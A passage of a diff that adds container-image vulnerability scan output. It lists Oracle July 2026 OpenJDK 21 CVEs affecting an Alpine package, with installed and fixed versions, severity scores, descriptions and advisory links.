+│                       │      │                  ├ [20]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-41254 
+│                       │      │                  ├ [21]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-46917 
+│                       │      │                  ├ [22]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-46968 
+│                       │      │                  ├ [23]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47010 
+│                       │      │                  ├ [24]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47021 
+│                       │      │                  ├ [25]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47027 
+│                       │      │                  ├ [26]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47059 
+│                       │      │                  ├ [27]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47063 
+│                       │      │                  ├ [28]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-60147 
+│                       │      │                  ├ [29]: https://errata.almalinux.org/10/ALSA-2026-42895.html 
+│                       │      │                  ├ [30]: https://errata.rockylinux.org/RLSA-2026:42899 
+│                       │      │                  ├ [31]: https://linux.oracle.com/cve/CVE-2026-47027.html 
+│                       │      │                  ├ [32]: https://linux.oracle.com/errata/ELSA-2026-42899.html 
+│                       │      │                  ├ [33]: https://nvd.nist.gov/vuln/detail/CVE-2026-47027 
+│                       │      │                  ├ [34]: https://www.cve.org/CVERecord?id=CVE-2026-47027 
+│                       │      │                  ╰ [35]: https://www.oracle.com/security-alerts/cpujul2026.html 
+│                       │      ├ PublishedDate   : 2026-07-21T22:17:08.25Z 
+│                       │      ╰ LastModifiedDate: 2026-08-03T18:55:05.263Z 
+│                       ├ [16] ╭ VulnerabilityID : CVE-2026-60147 
+│                       │      ├ PkgID           : openjdk21-jre-headless@21.0.11_p10-r0 
+│                       │      ├ PkgName         : openjdk21-jre-headless 
+│                       │      ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/openjdk21-jre-headless@21.0.11_p10-r0?
+│                       │      │                  │       arch=x86_64&distro=3.24.1 
+│                       │      │                  ╰ UID : e50dcf6a51ec8089 
+│                       │      ├ InstalledVersion: 21.0.11_p10-r0 
+│                       │      ├ FixedVersion    : 21.0.12_p8-r0 
+│                       │      ├ Status          : fixed 
+│                       │      ├ Layer            ╭ Digest: sha256:e75cbaefc0433d7c5850cec05a6c533ef54d45c19126
+│                       │      │                  │         4e4c9f62e347164a4006 
+│                       │      │                  ╰ DiffID: sha256:6fa3fec420de0c2f78798883e529d478f398e7489ffa
+│                       │      │                            77bbbb6e1ea62d15f4ee 
+│                       │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-60147 
+│                       │      ├ DataSource       ╭ ID  : alpine 
+│                       │      │                  ├ Name: Alpine Secdb 
+│                       │      │                  ╰ URL : https://secdb.alpinelinux.org/ 
+│                       │      ├ Fingerprint     : sha256:a10379e050b893e65cbb9b1726cac164a96cd838e04f9a55c26e8
+│                       │      │                   7a4e63777c9 
+│                       │      ├ Title           : openjdk: OpenJDK: Improve certification checking (Oracle CPU
+│                       │      │                    2026-07) 
+│                       │      ├ Description     : Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK,
+│                       │      │                    Oracle GraalVM Enterprise Edition product of Oracle Java SE
+│                       │      │                    (component: Security).  Supported versions that are
+│                       │      │                   affected are Oracle Java SE: 8u491, 8u491-perf, 11.0.31,
+│                       │      │                   17.0.19, 21.0.11, 25.0.3, 26.0.1; Oracle GraalVM for JDK:
+│                       │      │                   17.0.19 and  21.0.11; Oracle GraalVM Enterprise Edition:
+│                       │      │                   21.3.18. Easily exploitable vulnerability allows
+│                       │      │                   unauthenticated attacker with network access via multiple
+│                       │      │                   protocols to compromise Oracle Java SE, Oracle GraalVM for
+│                       │      │                   JDK, Oracle GraalVM Enterprise Edition.  Successful attacks
+│                       │      │                   of this vulnerability can result in  unauthorized update,
+│                       │      │                   insert or delete access to some of Oracle Java SE, Oracle
+│                       │      │                   GraalVM for JDK, Oracle GraalVM Enterprise Edition
+│                       │      │                   accessible data as well as  unauthorized read access to a
+│                       │      │                   subset of Oracle Java SE, Oracle GraalVM for JDK, Oracle
+│                       │      │                   GraalVM Enterprise Edition accessible data. Note: This
+│                       │      │                   vulnerability can be exploited by using APIs in the
+│                       │      │                   specified Component, e.g., through a web service which
+│                       │      │                   supplies data to the APIs. This vulnerability also applies
+│                       │      │                   to Java deployments, typically in clients running sandboxed
+│                       │      │                   Java Web Start applications or sandboxed Java applets, that
+│                       │      │                   load and run untrusted code (e.g., code that comes from the
+│                       │      │                   internet) and rely on the Java sandbox for security. CVSS
+│                       │      │                   3.1 Base Score 6.5 (Confidentiality and Integrity impacts). 
+│                       │      │                    CVSS Vector:
+│                       │      │                   (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N). 
+│                       │      ├ Severity        : MEDIUM 
+│                       │      ├ CweIDs           ─ [0]: CWE-284 
+│                       │      ├ VendorSeverity   ╭ alma       : 3 
+│                       │      │                  ├ oracle-oval: 3 
+│                       │      │                  ├ redhat     : 2 
+│                       │      │                  ╰ rocky      : 3 
+│                       │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L
+│                       │      │                           │           /A:N 
+│                       │      │                           ╰ V3Score : 6.5 
+│                       │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:42895 
+│                       │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-60147 
+│                       │      │                  ├ [2] : https://bugzilla.redhat.com/2459420 
+│                       │      │                  ├ [3] : https://bugzilla.redhat.com/2502751 
+│                       │      │                  ├ [4] : https://bugzilla.redhat.com/2502782 
+│                       │      │                  ├ [5] : https://bugzilla.redhat.com/2502783 
+│                       │      │                  ├ [6] : https://bugzilla.redhat.com/2502784 
+│                       │      │                  ├ [7] : https://bugzilla.redhat.com/2502791 
+│                       │      │                  ├ [8] : https://bugzilla.redhat.com/2502792 
+│                       │      │                  ├ [9] : https://bugzilla.redhat.com/2502793 
+│                       │      │                  ├ [10]: https://bugzilla.redhat.com/2503636 
+│                       │      │                  ├ [11]: https://bugzilla.redhat.com/show_bug.cgi?id=2459420 
+│                       │      │                  ├ [12]: https://bugzilla.redhat.com/show_bug.cgi?id=2502751 
+│                       │      │                  ├ [13]: https://bugzilla.redhat.com/show_bug.cgi?id=2502782 
+│                       │      │                  ├ [14]: https://bugzilla.redhat.com/show_bug.cgi?id=2502783 
+│                       │      │                  ├ [15]: https://bugzilla.redhat.com/show_bug.cgi?id=2502784 
+│                       │      │                  ├ [16]: https://bugzilla.redhat.com/show_bug.cgi?id=2502791 
+│                       │      │                  ├ [17]: https://bugzilla.redhat.com/show_bug.cgi?id=2502792 
+│                       │      │                  ├ [18]: https://bugzilla.redhat.com/show_bug.cgi?id=2502793 
+│                       │      │                  ├ [19]: https://bugzilla.redhat.com/show_bug.cgi?id=2503636 
+│                       │      │                  ├ [20]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-41254 
+│                       │      │                  ├ [21]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-46917 
+│                       │      │                  ├ [22]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-46968 
+│                       │      │                  ├ [23]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47010 
+│                       │      │                  ├ [24]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47021 
+│                       │      │                  ├ [25]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47027 
+│                       │      │                  ├ [26]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47059 
+│                       │      │                  ├ [27]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47063 
+│                       │      │                  ├ [28]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-60147 
+│                       │      │                  ├ [29]: https://errata.almalinux.org/10/ALSA-2026-42895.html 
+│                       │      │                  ├ [30]: https://errata.rockylinux.org/RLSA-2026:42899 
+│                       │      │                  ├ [31]: https://linux.oracle.com/cve/CVE-2026-60147.html 
+│                       │      │                  ├ [32]: https://linux.oracle.com/errata/ELSA-2026-42899.html 
+│                       │      │                  ├ [33]: https://nvd.nist.gov/vuln/detail/CVE-2026-60147 
+│                       │      │                  ├ [34]: https://www.cve.org/CVERecord?id=CVE-2026-60147 
+│                       │      │                  ╰ [35]: https://www.oracle.com/security-alerts/cpujul2026.html 
+│                       │      ├ PublishedDate   : 2026-07-21T22:17:15.407Z 
+│                       │      ╰ LastModifiedDate: 2026-08-03T18:49:46.977Z 
+│                       ├ [17] ╭ VulnerabilityID : CVE-2026-47010 
+│                       │      ├ PkgID           : openjdk21-jre-headless@21.0.11_p10-r0 
+│                       │      ├ PkgName         : openjdk21-jre-headless 
+│                       │      ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/openjdk21-jre-headless@21.0.11_p10-r0?
+│                       │      │                  │       arch=x86_64&distro=3.24.1 
+│                       │      │                  ╰ UID : e50dcf6a51ec8089 
+│                       │      ├ InstalledVersion: 21.0.11_p10-r0 
+│                       │      ├ FixedVersion    : 21.0.12_p8-r0 
+│                       │      ├ Status          : fixed 
+│                       │      ├ Layer            ╭ Digest: sha256:e75cbaefc0433d7c5850cec05a6c533ef54d45c19126
+│                       │      │                  │         4e4c9f62e347164a4006 
+│                       │      │                  ╰ DiffID: sha256:6fa3fec420de0c2f78798883e529d478f398e7489ffa
+│                       │      │                            77bbbb6e1ea62d15f4ee 
+│                       │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-47010 
+│                       │      ├ DataSource       ╭ ID  : alpine 
+│                       │      │                  ├ Name: Alpine Secdb 
+│                       │      │                  ╰ URL : https://secdb.alpinelinux.org/ 
+│                       │      ├ Fingerprint     : sha256:aa4191c4c43a15b9297ed776b692fcd7de2c7e7cc387667c7e044
+│                       │      │                   f1f776324d5 
+│                       │      ├ Title           : openjdk: OpenJDK: Enhance JPEG handling (Oracle CPU 2026-07) 
+│                       │      ├ Description     : Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK,
+│                       │      │                    Oracle GraalVM Enterprise Edition product of Oracle Java SE
+│                       │      │                    (component: ImageIO).  Supported versions that are affected
+│                       │      │                    are Oracle Java SE: 8u491, 8u491-perf, 11.0.31, 17.0.19,
+│                       │      │                   21.0.11, 25.0.3, 26.0.1; Oracle GraalVM for JDK: 17.0.19 and
+│                       │      │                     21.0.11; Oracle GraalVM Enterprise Edition: 21.3.18.
+│                       │      │                   Difficult to exploit vulnerability allows unauthenticated
+│                       │      │                   attacker with network access via multiple protocols to
+│                       │      │                   compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle
+│                       │      │                   GraalVM Enterprise Edition.  Successful attacks of this
+│                       │      │                   vulnerability can result in  unauthorized update, insert or
+│                       │      │                   delete access to some of Oracle Java SE, Oracle GraalVM for
+│                       │      │                   JDK, Oracle GraalVM Enterprise Edition accessible data.
+│                       │      │                   Note: This vulnerability can be exploited by using APIs in
+│                       │      │                   the specified Component, e.g., through a web service which
+│                       │      │                   supplies data to the APIs. This vulnerability also applies
+│                       │      │                   to Java deployments, typically in clients running sandboxed
+│                       │      │                   Java Web Start applications or sandboxed Java applets, that
+│                       │      │                   load and run untrusted code (e.g., code that comes from the
+│                       │      │                   internet) and rely on the Java sandbox for security. CVSS
+│                       │      │                   3.1 Base Score 3.7 (Integrity impacts).  CVSS Vector:
+│                       │      │                   (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N). 
+│                       │      ├ Severity        : LOW 
+│                       │      ├ CweIDs           ─ [0]: CWE-284 
+│                       │      ├ VendorSeverity   ╭ alma       : 3 
+│                       │      │                  ├ oracle-oval: 3 
+│                       │      │                  ├ redhat     : 1 
+│                       │      │                  ╰ rocky      : 3 
+│                       │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L
+│                       │      │                           │           /A:N 
+│                       │      │                           ╰ V3Score : 3.7 
+│                       │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:42895 
+│                       │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-47010 
+│                       │      │                  ├ [2] : https://bugzilla.redhat.com/2459420 
+│                       │      │                  ├ [3] : https://bugzilla.redhat.com/2502751 
+│                       │      │                  ├ [4] : https://bugzilla.redhat.com/2502782 
+│                       │      │                  ├ [5] : https://bugzilla.redhat.com/2502783 
+│                       │      │                  ├ [6] : https://bugzilla.redhat.com/2502784 
+│                       │      │                  ├ [7] : https://bugzilla.redhat.com/2502791 
+│                       │      │                  ├ [8] : https://bugzilla.redhat.com/2502792 
+│                       │      │                  ├ [9] : https://bugzilla.redhat.com/2502793 
+│                       │      │                  ├ [10]: https://bugzilla.redhat.com/2503636 
+│                       │      │                  ├ [11]: https://bugzilla.redhat.com/show_bug.cgi?id=2459420 
+│                       │      │                  ├ [12]: https://bugzilla.redhat.com/show_bug.cgi?id=2502751 
+│                       │      │                  ├ [13]: https://bugzilla.redhat.com/show_bug.cgi?id=2502782 
+│                       │      │                  ├ [14]: https://bugzilla.redhat.com/show_bug.cgi?id=2502783 
+│                       │      │                  ├ [15]: https://bugzilla.redhat.com/show_bug.cgi?id=2502784 
+│                       │      │                  ├ [16]: https://bugzilla.redhat.com/show_bug.cgi?id=2502791 
+│                       │      │                  ├ [17]: https://bugzilla.redhat.com/show_bug.cgi?id=2502792 
+│                       │      │                  ├ [18]: https://bugzilla.redhat.com/show_bug.cgi?id=2502793 
+│                       │      │                  ├ [19]: https://bugzilla.redhat.com/show_bug.cgi?id=2503636 
+│                       │      │                  ├ [20]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-41254 
+│                       │      │                  ├ [21]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-46917 
+│                       │      │                  ├ [22]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-46968 
+│                       │      │                  ├ [23]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47010 
+│                       │      │                  ├ [24]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47021 
+│                       │      │                  ├ [25]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47027 
+│                       │      │                  ├ [26]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47059 
+│                       │      │                  ├ [27]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47063 
+│                       │      │                  ├ [28]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-60147 
+│                       │      │                  ├ [29]: https://errata.almalinux.org/10/ALSA-2026-42895.html 
+│                       │      │                  ├ [30]: https://errata.rockylinux.org/RLSA-2026:42899 
+│                       │      │                  ├ [31]: https://linux.oracle.com/cve/CVE-2026-47010.html 
+│                       │      │                  ├ [32]: https://linux.oracle.com/errata/ELSA-2026-42899.html 
+│                       │      │                  ├ [33]: https://nvd.nist.gov/vuln/detail/CVE-2026-47010 
+│                       │      │                  ├ [34]: https://www.cve.org/CVERecord?id=CVE-2026-47010 
+│                       │      │                  ╰ [35]: https://www.oracle.com/security-alerts/cpujul2026.html 
+│                       │      ├ PublishedDate   : 2026-07-21T22:17:06.497Z 
+│                       │      ╰ LastModifiedDate: 2026-07-31T15:13:21.283Z 
+│                       ├ [18] ╭ VulnerabilityID : CVE-2026-47059 
+│                       │      ├ PkgID           : openjdk21-jre-headless@21.0.11_p10-r0 
+│                       │      ├ PkgName         : openjdk21-jre-headless 
+│                       │      ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/openjdk21-jre-headless@21.0.11_p10-r0?
+│                       │      │                  │       arch=x86_64&distro=3.24.1 
+│                       │      │                  ╰ UID : e50dcf6a51ec8089 
+│                       │      ├ InstalledVersion: 21.0.11_p10-r0 
+│                       │      ├ FixedVersion    : 21.0.12_p8-r0 
+│                       │      ├ Status          : fixed 
+│                       │      ├ Layer            ╭ Digest: sha256:e75cbaefc0433d7c5850cec05a6c533ef54d45c19126
+│                       │      │                  │         4e4c9f62e347164a4006 
+│                       │      │                  ╰ DiffID: sha256:6fa3fec420de0c2f78798883e529d478f398e7489ffa
+│                       │      │                            77bbbb6e1ea62d15f4ee 
+│                       │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-47059 
+│                       │      ├ DataSource       ╭ ID  : alpine 
+│                       │      │                  ├ Name: Alpine Secdb 
+│                       │      │                  ╰ URL : https://secdb.alpinelinux.org/ 
+│                       │      ├ Fingerprint     : sha256:3fddf854d643abe5888139582a82e5f514d4fc6a1869a7856863c
+│                       │      │                   e6625493503 
+│                       │      ├ Title           : openjdk: OpenJDK: Enhance AWT ImagingLib (Oracle CPU 2026-07) 
+│                       │      ├ Description     : Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK,
+│                       │      │                    Oracle GraalVM Enterprise Edition product of Oracle Java SE
+│                       │      │                    (component: 2D).  Supported versions that are affected are
+│                       │      │                   Oracle Java SE: 8u491, 8u491-perf, 11.0.31, 17.0.19,
+│                       │      │                   21.0.11, 25.0.3, 26.0.1; Oracle GraalVM for JDK: 17.0.19 and
+│                       │      │                     21.0.11; Oracle GraalVM Enterprise Edition: 21.3.18.
+│                       │      │                   Difficult to exploit vulnerability allows unauthenticated
+│                       │      │                   attacker with network access via multiple protocols to
+│                       │      │                   compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle
+│                       │      │                   GraalVM Enterprise Edition.  Successful attacks of this
+│                       │      │                   vulnerability can result in unauthorized ability to cause a
+│                       │      │                   partial denial of service (partial DOS) of Oracle Java SE,
+│                       │      │                   Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition.
+│                       │      │                   Note: This vulnerability applies to Java deployments,
+│                       │      │                   typically in clients running sandboxed Java Web Start
+│                       │      │                   applications or sandboxed Java applets, that load and run
+│                       │      │                   untrusted code (e.g., code that comes from the internet) and
+│                       │      │                    rely on the Java sandbox for security. This vulnerability
+│                       │      │                   does not apply to Java deployments, typically in servers,
+│                       │      │                   that load and run only trusted code (e.g., code installed by
+│                       │      │                    an administrator). CVSS 3.1 Base Score 3.7 (Availability
+│                       │      │                   impacts).  CVSS Vector:
+│                       │      │                   (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L). 
+│                       │      ├ Severity        : LOW 
+│                       │      ├ CweIDs           ─ [0]: CWE-284 
+│                       │      ├ VendorSeverity   ╭ alma       : 3 
+│                       │      │                  ├ oracle-oval: 3 
+│                       │      │                  ├ redhat     : 1 
+│                       │      │                  ╰ rocky      : 3 
+│                       │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N
+│                       │      │                           │           /A:L 
+│                       │      │                           ╰ V3Score : 3.7 
+│                       │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:42895 
+│                       │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-47059 
+│                       │      │                  ├ [2] : https://bugzilla.redhat.com/2459420 
+│                       │      │                  ├ [3] : https://bugzilla.redhat.com/2502751 
+│                       │      │                  ├ [4] : https://bugzilla.redhat.com/2502782 
+│                       │      │                  ├ [5] : https://bugzilla.redhat.com/2502783 
+│                       │      │                  ├ [6] : https://bugzilla.redhat.com/2502784 
+│                       │      │                  ├ [7] : https://bugzilla.redhat.com/2502791 
+│                       │      │                  ├ [8] : https://bugzilla.redhat.com/2502792 
+│                       │      │                  ├ [9] : https://bugzilla.redhat.com/2502793 
+│                       │      │                  ├ [10]: https://bugzilla.redhat.com/2503636 
+│                       │      │                  ├ [11]: https://bugzilla.redhat.com/show_bug.cgi?id=2459420 
+│                       │      │                  ├ [12]: https://bugzilla.redhat.com/show_bug.cgi?id=2502751 
+│                       │      │                  ├ [13]: https://bugzilla.redhat.com/show_bug.cgi?id=2502782 
+│                       │      │                  ├ [14]: https://bugzilla.redhat.com/show_bug.cgi?id=2502783 
+│                       │      │                  ├ [15]: https://bugzilla.redhat.com/show_bug.cgi?id=2502784 
+│                       │      │                  ├ [16]: https://bugzilla.redhat.com/show_bug.cgi?id=2502791 
+│                       │      │                  ├ [17]: https://bugzilla.redhat.com/show_bug.cgi?id=2502792 
+│                       │      │                  ├ [18]: https://bugzilla.redhat.com/show_bug.cgi?id=2502793 
+│                       │      │                  ├ [19]: https://bugzilla.redhat.com/show_bug.cgi?id=2503636 
+│                       │      │                  ├ [20]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-41254 
+│                       │      │                  ├ [21]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-46917 
+│                       │      │                  ├ [22]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-46968 
+│                       │      │                  ├ [23]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47010 
+│                       │      │                  ├ [24]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47021 
+│                       │      │                  ├ [25]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47027 
+│                       │      │                  ├ [26]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47059 
+│                       │      │                  ├ [27]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47063 
+│                       │      │                  ├ [28]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-60147 
+│                       │      │                  ├ [29]: https://errata.almalinux.org/10/ALSA-2026-42895.html 
+│                       │      │                  ├ [30]: https://errata.rockylinux.org/RLSA-2026:42899 
+│                       │      │                  ├ [31]: https://linux.oracle.com/cve/CVE-2026-47059.html 
+│                       │      │                  ├ [32]: https://linux.oracle.com/errata/ELSA-2026-42899.html 
+│                       │      │                  ├ [33]: https://nvd.nist.gov/vuln/detail/CVE-2026-47059 
+│                       │      │                  ├ [34]: https://www.cve.org/CVERecord?id=CVE-2026-47059 
+│                       │      │                  ╰ [35]: https://www.oracle.com/security-alerts/cpujul2026.html 
+│                       │      ├ PublishedDate   : 2026-07-21T22:17:11.727Z 
+│                       │      ╰ LastModifiedDate: 2026-08-03T18:51:30.65Z 
+│                       ╰ [19] ╭ VulnerabilityID : CVE-2026-62574 
+│                              ├ PkgID           : openjdk21-jre-headless@21.0.11_p10-r0 
+│                              ├ PkgName         : openjdk21-jre-headless 
+│                              ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/openjdk21-jre-headless@21.0.11_p10-r0?
+│                              │                  │       arch=x86_64&distro=3.24.1 
+│                              │                  ╰ UID : e50dcf6a51ec8089 
+│                              ├ InstalledVersion: 21.0.11_p10-r0 
+│                              ├ FixedVersion    : 21.0.12_p8-r0 
+│                              ├ Status          : fixed 
+│                              ├ Layer            ╭ Digest: sha256:e75cbaefc0433d7c5850cec05a6c533ef54d45c19126
+│                              │                  │         4e4c9f62e347164a4006 
+│                              │                  ╰ DiffID: sha256:6fa3fec420de0c2f78798883e529d478f398e7489ffa
+│                              │                            77bbbb6e1ea62d15f4ee 
+│                              ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-62574 
+│                              ├ DataSource       ╭ ID  : alpine 
+│                              │                  ├ Name: Alpine Secdb 
+│                              │                  ╰ URL : https://secdb.alpinelinux.org/ 
+│                              ├ Fingerprint     : sha256:2db13eb11a35ce081d6e93b395da43c2d410f59aab4c926d672df
+│                              │                   ce736447cfa 
+│                              ├ Description     : Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK,
+│                              │                    Oracle GraalVM Enterprise Edition product of Oracle Java SE
+│                              │                    (component: Install).  Supported versions that are affected
+│                              │                    are Oracle Java SE: 8u491, 11.0.31, 17.0.19, 21.0.11,
+│                              │                   25.0.3, 26.0.1; Oracle GraalVM for JDK: 17.0.19 and 
+│                              │                   21.0.11; Oracle GraalVM Enterprise Edition: 21.3.18. Easily
+│                              │                   exploitable vulnerability allows low privileged attacker
+│                              │                   with logon to the infrastructure where Oracle Java SE,
+│                              │                   Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition
+│                              │                   executes to compromise Oracle Java SE, Oracle GraalVM for
+│                              │                   JDK, Oracle GraalVM Enterprise Edition.  Successful attacks
+│                              │                   of this vulnerability can result in takeover of Oracle Java
+│                              │                   SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise
+│                              │                   Edition. CVSS 3.1 Base Score 7.8 (Confidentiality, Integrity
+│                              │                    and Availability impacts).  CVSS Vector:
+│                              │                   (CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H). 
+│                              ├ Severity        : UNKNOWN 
+│                              ├ CweIDs           ─ [0]: CWE-284 
+│                              ├ References       ─ [0]: https://www.oracle.com/security-alerts/cpujul2026.html 
+│                              ├ PublishedDate   : 2026-07-21T22:19:09.667Z 
+│                              ╰ LastModifiedDate: 2026-08-03T18:37:03.21Z 
+╰ [1] ╭ Target  : Java 
+      ├ Class   : lang-pkgs 
+      ├ Type    : jar 
+      ╰ Packages 
 ```
